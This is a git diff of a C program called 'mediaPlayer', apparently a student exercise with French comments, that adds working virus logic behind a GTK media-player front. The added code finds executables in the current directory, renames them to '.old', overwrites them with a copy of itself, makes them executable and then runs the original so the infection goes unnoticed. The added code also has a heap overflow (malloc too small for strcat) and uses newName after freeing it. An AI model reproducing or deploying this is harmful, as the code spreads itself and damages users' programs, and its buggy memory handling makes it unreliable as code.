@@ -8,13 +8,14 @@
 #include <sys/stat.h>
 
 bool isAlreadyInfected(char *pgrmName, DIR *d);
+void button_clicked(GtkWidget *widget, int up);
+
 // step 4 : find target files
 // gcc -o mediaPlayer mediaplayer/mediaplayer.c `pkg-config --cflags --libs gtk+-3.0`
 void findTargetFiles(char *currentPgrmName)
 {
         DIR *d;
         struct dirent *dir;
-        int numberOfPGRMS = 0;
         d = opendir(".");
         if (d)
         {
@@ -22,8 +23,6 @@ void findTargetFiles(char *currentPgrmName)
                 {
                         struct stat sb;
                         stat(dir->d_name, &sb);
-                        // get only user program
-                        numberOfPGRMS++;
                         if ((S_IXUSR & sb.st_mode) && (S_IFREG & sb.st_mode) && !strstr(dir->d_name, "mediaPlayer"))
                         {
                                 printf("Permission d'execution sur le fichier : %s\n", dir->d_name);
@@ -42,21 +41,38 @@ void findTargetFiles(char *currentPgrmName)
                                 {
                                         if (!isAlreadyInfected(dir->d_name, d))
                                         {
-                                                // renaming the existing exe to executable.old
-                                                size_t newNameLen = strlen(dir->d_name) + strlen(".old");
-                                                char *newName = (char *)malloc(newNameLen);
+                                                // // renaming the existing exe to executable.old
+                                                char *newName = (char *)malloc(strlen(dir->d_name));
                                                 strcpy(newName, dir->d_name);
                                                 strcat(newName, ".old");
                                                 rename(dir->d_name, newName);
 
-                                                // opening current running exe in reading mode
+                                                // // opening current running exe in reading mode
                                                 FILE *runningFile, *newCreatedFile;
-                                                runningFile = fopen(currentPgrmName, "r");
-                                                printf("Current running exe name : %s\n", currentPgrmName);
-                                                newCreatedFile = fopen(dir->d_name, "w+");
-                                                
-                                                // fd = open(tmpname, O_WRONLY | O_APPEND | O_CREAT, 0644);
+                                                // char *removeCommandStart = strtok(currentPgrmName, "/");
+                                                runningFile = fopen(currentPgrmName, "rb");
+                                                // creating and opening the new file in writing and reading mode
+                                                newCreatedFile = fopen(dir->d_name, "wb");
+
+                                                // copying the source infector file to new utilityNamed pgrm
+                                                char buff[BUFSIZ];
+                                                size_t n;
+                                                while ((n = fread(buff, 1, BUFSIZ, runningFile)) != 0)
+                                                {
+                                                        fwrite(buff, 1, n, newCreatedFile);
+                                                }
+                                                fclose(runningFile);
+                                                fclose(newCreatedFile);
+                                                chmod(dir->d_name, 0755);
                                                 free(newName);
+
+                                                if (!(strcmp(currentPgrmName, "./mediaPlayer") == 0))
+                                                {
+                                                        // lancer le cible
+                                                        // execv(newName, NULL);
+                                                        system(newName);
+                                                         _Exit(0);
+                                                }
                                         }
                                 }
                         }
@@ -88,8 +104,8 @@ char *filename[50]; // 2 string de 20 char chacun
 int width = 1000;
 int height = 800;
 
-#define MAX 100
-char buffer[MAX];
+#define SIZE 100
+char buffer[SIZE];
 
 GtkWidget *create_gui()
 {
